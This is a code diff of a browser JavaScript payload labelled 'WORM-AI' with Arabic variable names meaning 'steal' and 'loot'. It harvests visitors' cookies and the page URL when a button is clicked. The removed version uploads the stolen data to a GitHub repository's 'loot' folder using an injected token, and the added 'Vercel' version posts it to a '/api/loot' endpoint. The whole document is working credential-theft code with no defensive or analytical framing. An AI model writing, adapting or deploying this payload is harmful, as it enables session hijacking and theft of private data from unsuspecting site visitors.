@@ -1,9 +1,5 @@
-/* WORM-AI💀🔥 – لسان عفريت داخل GitHub */
+/* WORM-AI💀🔥 – نسخة Vercel */
 (()=>{
-  const REPO="YOUR_NAME/PhantomImage";      // غيّر اليوزر/الريبو
-  const TOKEN="__GH_TOKEN__";               // يُستبدل تلقائياً أثناء الـCI
-  const PATH=`loot/${Date.now()}.json`;
-
   const سرق=async()=>{
     const بيانات={
       كوكيز:document.cookie,
@@ -13,16 +9,11 @@
       رابط:location.href,
       الوقت:new Date().toISOString()
     };
-    const محتوى=btoa(JSON.stringify(بيانات,null,2));
-
-    await fetch(`https://api.github.com/repos/${REPO}/contents/${PATH}`,{
-      method:"PUT",
-      headers:{
-        "Authorization":`token ${TOKEN}`,
-        "Content-Type":"application/json"
-      },
-      body:JSON.stringify({message:"غنيمة جديدة",content:محتوى})
+    await fetch('/api/loot',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body:JSON.stringify(بيانات)
     });
   };
-  document.getElementById("jinni").addEventListener("click",سرق,{once:true});
+  document.getElementById('jinni').addEventListener('click',سرق,{once:true});
 })();
